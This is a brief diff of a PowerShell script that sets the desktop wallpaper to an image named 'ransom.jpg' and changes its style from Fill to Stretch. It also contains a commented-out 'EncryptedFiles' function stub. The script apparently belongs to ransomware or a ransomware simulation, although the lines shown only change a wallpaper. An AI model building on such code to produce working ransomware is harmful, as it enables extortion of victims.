@@ -74,7 +74,7 @@ public class Params
     $ret = [Params]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $Image, $fWinIni)
 }
  
-Set-WallPaper -Image "C:\temp\ransom.jpg" -Style Fill
+Set-WallPaper -Image "C:\temp\ransom.jpg" -Style Stretch
 
 # Start-Sleep 3
 # function EncryptedFiles 
